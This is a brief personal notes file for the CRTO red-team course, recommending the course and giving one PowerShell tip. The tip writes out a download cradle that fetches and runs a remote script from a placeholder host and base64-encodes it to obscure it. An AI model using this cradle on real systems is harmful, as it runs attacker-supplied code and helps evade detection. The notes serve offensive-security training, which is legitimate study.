# CRTO Notes

**This will be the start of my CRTO review of the notes and the modules. I will combine this later on into the bigger methodology that I'm working on.**

Course is from zero point security, probably one of the best trainings I've received so far. I strongly recommend this to get started in red teaming. 

Course link: [Red Team Ops](https://training.zeropointsecurity.co.uk/courses/red-team-ops)


Side stuff:

for download powershell cradle and base64, in powershell do like so
```
$str = 'iex (new-object net.webclient).downloadstring("http://ip:port/uri")'
[System.Convert]::ToBase64String([System.text.Encoding]::Unicode.GetBytes($str))
```
